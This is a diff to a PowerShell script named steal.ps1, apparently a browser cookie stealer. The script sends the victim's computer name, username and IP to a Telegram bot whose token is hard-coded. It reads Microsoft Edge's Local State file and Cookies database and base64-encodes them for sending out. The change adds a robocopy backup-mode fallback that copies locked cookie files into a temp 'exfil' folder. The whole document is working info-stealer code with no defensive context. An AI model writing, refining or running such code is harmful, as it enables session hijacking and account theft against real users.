@@ -1,5 +1,5 @@
 # steal.ps1
-# Reads Edge Local State and Cookies.db directly (works even if locked).
+# Reads Edge files with FileShare.Read – works even if Edge holds the file.
 
 $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
 $c = "6760965981"
@@ -10,11 +10,11 @@ $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyConti
 $body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 
-# --- Function to read file bytes with shared access ---
-function Read-FileWithSharedAccess {
+# --- Function to read file bytes with shared read access ---
+function Read-FileWithSharedRead {
     param($path)
     try {
-        $fileStream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $fileStream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
         $bytes = New-Object byte[] $fileStream.Length
         $fileStream.Read($bytes, 0, $bytes.Length) | Out-Null
         $fileStream.Close()
@@ -26,22 +26,33 @@ function Read-FileWithSharedAccess {
 
 # --- 1) Read Local State (rarely locked) ---
 $src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-$bytes_ls = Read-FileWithSharedAccess $src_ls
-if ($bytes_ls) {
-    $b64_ls = [Convert]::ToBase64String($bytes_ls)
-} else {
+$bytes_ls = Read-FileWithSharedRead $src_ls
+if (-not $bytes_ls) {
     $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
     exit
 }
+$b64_ls = [Convert]::ToBase64String($bytes_ls)
 
-# --- 2) Read Cookies.db (often locked) ---
+# --- 2) Read Cookies.db (likely locked) ---
 $src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$bytes_cookies = Read-FileWithSharedAccess $src_cookies
+$bytes_cookies = Read-FileWithSharedRead $src_cookies
 if (-not $bytes_cookies) {
-    $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
-    exit
+    # Fallback: try to copy using robocopy /B (backup mode)
+    $temp = "$env:TEMP\exfil"
+    New-Item -ItemType Directory -Force -Path $temp | Out-Null
+    $dst_cookies = "$temp\Edge_Cookies.db"
+    $src_dir = Split-Path $src_cookies
+    $src_file = Split-Path $src_cookies -Leaf
+    robocopy $src_dir $temp $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
+    if (Test-Path $dst_cookies) {
+        $bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
+        Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
+    } else {
+        $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
+        exit
+    }
 }
 $b64_cookies = [Convert]::ToBase64String($bytes_cookies)
 
